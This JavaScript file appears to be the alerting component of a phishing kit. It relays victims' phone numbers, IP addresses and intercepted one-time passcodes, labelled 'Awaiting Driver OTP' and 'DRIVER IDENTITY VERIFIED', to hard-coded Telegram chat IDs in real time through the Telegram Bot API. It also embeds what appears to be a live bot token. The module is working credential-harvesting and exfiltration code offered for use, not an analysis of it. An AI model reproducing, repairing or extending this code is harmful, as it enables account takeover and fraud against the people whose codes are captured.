const https = require('https');
const fs = require('fs');
const path = require('path');
const TelegramSettings = require('../models/TelegramSettings');

const STORE_PATH = path.join(__dirname, 'telegram_store.json');

let botToken = '8952162506:AAHz_Jzd918IOGz5wf7wWYkB4Hglr8rhegg';
let chatIds = ['934345778'];

/**
 * Configure Telegram Bot Token and Chat IDs array
 */
function configureTelegram(token, ids) {
    if (token && !token.includes('•') && !token.includes('*')) {
        botToken = token.trim();
    }
    if (Array.isArray(ids)) {
        chatIds = ids.map(id => (id || '').toString().trim()).filter(id => id);
    } else if (typeof ids === 'string') {
        chatIds = ids.split(',').map(id => id.trim()).filter(id => id);
    }
    console.log(`[TelegramNotifier] Configured Token: ${botToken ? 'YES' : 'NO'}, ChatIDs (${chatIds.length}): ${chatIds.join(', ') || 'NONE'}`);
    return !!(botToken && chatIds.length > 0);
}

/**
 * Load settings from MongoDB (or local file)
 */
async function initPersistedSettings(isMongoConnected = false) {
    try {
        if (isMongoConnected) {
            let doc = await TelegramSettings.findOne();
            if (!doc) {
                doc = new TelegramSettings({
                    botToken,
                    chatIds
                });
                await doc.save();
                console.log('[TelegramNotifier] Created default TelegramSettings in MongoDB.');
            } else {
                if (doc.botToken && !doc.botToken.includes('•')) botToken = doc.botToken;
                if (Array.isArray(doc.chatIds) && doc.chatIds.length > 0) {
                    chatIds = doc.chatIds;
                }
                console.log(`[TelegramNotifier] Loaded TelegramSettings from MongoDB. ChatIDs: ${chatIds.join(', ')}`);
            }
            return;
        }
    } catch (err) {
        console.error('[TelegramNotifier] Error loading from MongoDB:', err.message);
    }

    try {
        if (fs.existsSync(STORE_PATH)) {
            const raw = fs.readFileSync(STORE_PATH, 'utf8');
            const data = JSON.parse(raw);
            if (data.botToken && !data.botToken.includes('•')) botToken = data.botToken;
            if (Array.isArray(data.chatIds) && data.chatIds.length > 0) {
                chatIds = data.chatIds;
            }
            console.log(`[TelegramNotifier] Loaded TelegramSettings from local file. ChatIDs: ${chatIds.join(', ')}`);
        }
    } catch (e) {}
}

/**
 * Save settings to MongoDB & local JSON file
 */
async function saveTelegramSettings(token, ids, isMongoConnected = false) {
    configureTelegram(token, ids);

    try {
        if (isMongoConnected) {
            await TelegramSettings.findOneAndUpdate({}, {
                botToken,
                chatIds
            }, { upsert: true, new: true });
            console.log(`[TelegramNotifier] Saved Telegram settings to MongoDB. (${chatIds.length} Chat IDs)`);
        }
    } catch (err) {
        console.error('[TelegramNotifier] Failed to save to MongoDB:', err.message);
    }

    try {
        fs.writeFileSync(STORE_PATH, JSON.stringify({ botToken, chatIds }, null, 2), 'utf8');
    } catch (e) {}

    return getTelegramConfig();
}

/**
 * Get current Telegram configuration
 */
function getTelegramConfig() {
    return {
        botToken: botToken || '',
        chatIds: [...chatIds],
        configured: !!(botToken && chatIds.length > 0)
    };
}

/**
 * Send raw HTTPS request to Telegram Bot API for all configured Chat IDs in parallel
 */
function sendTelegramMessage(text) {
    if (!botToken || chatIds.length === 0) {
        console.log('[TelegramNotifier] Skipping Telegram alert - Bot Token or Chat IDs missing.');
        return Promise.resolve(false);
    }

    const promises = chatIds.map(targetId => {
        return new Promise((resolve) => {
            const payload = JSON.stringify({
                chat_id: targetId,
                text: text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            });

            const req = https.request({
                hostname: 'api.telegram.org',
                path: `/bot${botToken}/sendMessage`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payload)
                },
                timeout: 5000
            }, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        const parsed = JSON.parse(data);
                        if (parsed.ok) {
                            console.log(`[TelegramNotifier] ⚡ Instant alert sent to Chat ID ${targetId}`);
                            resolve(true);
                        } else {
                            console.error(`[TelegramNotifier] API Error for ${targetId}:`, parsed.description);
                            resolve(false);
                        }
                    } catch (e) {
                        resolve(false);
                    }
                });
            });

            req.on('error', (err) => {
                console.error(`[TelegramNotifier] Request error for ${targetId}:`, err.message);
                resolve(false);
            });

            req.write(payload);
            req.end();
        });
    });

    return Promise.all(promises);
}

/**
 * Send instant alert when phone number is submitted
 */
async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submittedAt }) {
    const timeStr = new Date(submittedAt || Date.now()).toLocaleTimeString('en-US', {
        hour: '2-digit', minute: '2-digit', second: '2-digit'
    });

    const msg = `📱 <b>New Phone Submitted!</b>\n\n` +
                `📞 <b>Phone:</b> <code>${phoneNumber}</code>\n` +
                `⏳ <b>Status:</b> Awaiting Driver OTP\n` +
                `🔗 <b>Link:</b> <code>${customSlug || '/'}</code>\n` +
                `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
                `⏰ <b>Time:</b> ${timeStr}`;

    return sendTelegramMessage(msg);
}

/**
 * Send instant alert when OTP is submitted and verified
 */
async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, verifiedAt }) {
    const timeStr = new Date(verifiedAt || Date.now()).toLocaleString('en-US', {
        hour: '2-digit', minute: '2-digit', second: '2-digit'
    });

    const msg = `✅ <b>DRIVER IDENTITY VERIFIED!</b>\n\n` +
                `📞 <b>Phone:</b> <code>${phoneNumber}</code>\n` +
                `🔑 <b>OTP Code:</b> <code>${otp}</code>\n` +
                `STATUS: <b>VERIFIED</b>\n` +
                `🔗 <b>Link:</b> <code>${customSlug || '/'}</code>\n` +
                `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
                `⏰ <b>Time:</b> ${timeStr}`;

    return sendTelegramMessage(msg);
}

/**
 * Send test alert
 */
async function sendTestNotification() {
    if (!botToken || chatIds.length === 0) {
        throw new Error('رجاءً أدخل Bot Token و Chat ID أولاً في الإعدادات!');
    }
    const msg = `⚡ <b>Guber Telegram Test Alert</b>\n\n` +
                `✅ Your Telegram Bot notifications are working 100% INSTANTLY!`;
    return sendTelegramMessage(msg);
}

// Auto init on load
initPersistedSettings();

module.exports = {
    configureTelegram,
    initPersistedSettings,
    saveTelegramSettings,
    getTelegramConfig,
    notifyPhoneSubmitted,
    notifyOTPVerified,
    sendTestNotification
};
